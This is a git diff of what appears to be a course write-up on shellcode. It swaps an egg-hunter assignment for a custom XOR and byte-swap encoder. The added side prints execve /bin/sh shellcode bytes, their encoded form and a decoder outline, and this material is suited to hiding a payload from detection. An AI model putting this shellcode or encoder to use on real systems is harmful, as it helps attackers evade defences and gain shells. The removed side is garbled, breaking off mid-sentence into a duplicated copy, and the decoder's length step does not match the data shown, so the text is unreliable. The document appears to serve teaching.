@@ -1,77 +1,66 @@
-# Assignment 3: The Egg Hunter shellcode
+# Assignment 4: Create a custom encoder
 
 ## Objectives
-In this assignment, I have to:
 
-* study about the Egg Hunter shellcode
-* implement a working Egg Hunter PoC in assembler
-* have the PoC easily configurable with different payloads 
+In this assignment I have to:
+	* create a custom encoding scheme
+	* create a full weaponized PoC with execve-stack shellcode
 
-## The Egg Hunter tecnique
+## Encoding out payload
 
-Imagine you find a buffer overflow but you have a very limited space in bytes
-to store your attack payload.
+The shellcode for execve-stack, with some optimization is 23 bytes long:
 
-The idea behind egg hunting is to store elsewhere your payload prepending it
-with a signature, repeated twice. Such a signature is the _egg_. The first
-stage is then a code that searches in memory for the signature and, when found,
-pass the control to the real payload.
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
 
-The key before the payload is inserted twice in order to:
+First step is to align this payload so to be a 4 multiple. Let's use \x90 as padding.
 
-* avoid collisions, making sure the hunter found the real egg and not a legit
-  bytes sequence that eventually is the same of the key
-* optimize the hunter, because it simple to implement the control for equality
-  between two contiguous regions of memory
+"\x31\xc0\x50\x68"
+"\x2f\x2f\x73\x68"
+"\x68\x2f\x62\x69"
+"\x6e\x89\xe3\x31"
+"\xc9\x31\xd2\xb0"
+"\x0b\xcd\x80\x90"
 
-Choosing a good key is also important. We can choose a funny key like
-_0xdeadbeef_ or _0x13371337_ and when found in memory jump 8 bytes onward to go
-into the real payload or, more optimized by risky in terms of collisions,
-# Assignment 3: The Egg Hunter shellcode
+We can XOR this block with a KEY. The key is 0xdeadbeef in our example.
 
-## Objectives
-In this assignment, I have to:
+"\xef\x6d\xee\x87"
+"\xf1\x82\xcd\x87"
+"\xb6\x82\xdc\x86"
+"\xb0\x24\x5d\xde"
+"\x17\x9c\x6c\x5f"
+"\xd5\x60\x3e\x7f"
 
-* study about the Egg Hunter shellcode
-* implement a working Egg Hunter PoC in assembler
-* have the PoC easily configurable with different payloads 
+We can swap first half and second half of each word
 
-## The Egg Hunter tecnique
+"\x87\xee\x6d\xef"
+"\x87\xcd\x82\xf1"
+"\x86\xdc\x82\xb6"
+"\xde\x5d\x24\xb0"
+"\x5f\x6c\x9c\x17"
+"\x7f\x3e\x60\xd5"
 
-Imagine you find a buffer overflow but you have a very limited space in bytes
-to store your attack payload.
+We prepend the payload with the actual number of byte of the shellcode, XOR-ed with the obfuscation key 0xdeadbeef
 
-The idea behind egg hunting is to store elsewhere your payload prepending it
-with a signature, repeated twice. Such a signature is the _egg_. The first
-stage is then a code that searches in memory for the signature and, when found,
-pass the control to the real payload.
+We have 24 bytes as payload
+"\x18\x18\x18\x18" -> xor(0xdeadbeef) -> "\xc6\xb5\xa6\xf7"
+Storing it swapped: "\xf7\xa6\xb5\xc6"
 
-The key before the payload is inserted twice in order to:
+"\xf7\xa6\xb5\xc6"
+"\x87\xee\x6d\xef"
+"\x87\xcd\x82\xf1"
+"\x86\xdc\x82\xb6"
+"\xde\x5d\x24\xb0"
+"\x5f\x6c\x9c\x17"
+"\x7f\x3e\x60\xd5"
 
-* avoid collisions, making sure the hunter found the real egg and not a legit
-  bytes sequence that eventually is the same of the key
-* optimize the hunter, because it simple to implement the control for equality
-  between two contiguous regions of memory
+## Decoding routine
 
-Choosing a good key is also important. We can choose a funny key like
-_0xdeadbeef_ or _0x13371337_ and when found in memory jump 8 bytes onward to go
-into the real payload or, more optimized by risky in terms of collisions,
-choose a key that makes sense in assembler.
+Given an encoded payload, the decoding route must be in place to make sure to
+revert our strategy.
 
-The paper "Safetly searching Process Virtual Address Space", use the 0x90509050
-as key. Such a key in assembler is translated in:
-
-> 90	; nop
-> 50	; push eax 
-> 90	; nop
-> 50	; push eax 
-
-I'd rather prefer having a customizable key, so I'll put in my egg hunter data
-section, threating it as it would not make sens in assembler.
-
-### References
-
-[Safetly searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
-https://www.corelan.be/index.php/2011/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
-https://www.exploit-db.com/exploits/17559/
-
+1) take the first dword, swap bytes and XOR with hardcoded key
+2) divide the value stored in AL with 8 and store on EDX the number of words
+	the payload is length
+3) for each of the n dword(s)
+	3.1) byte swap the words
+	3.2) xor with the encoding key
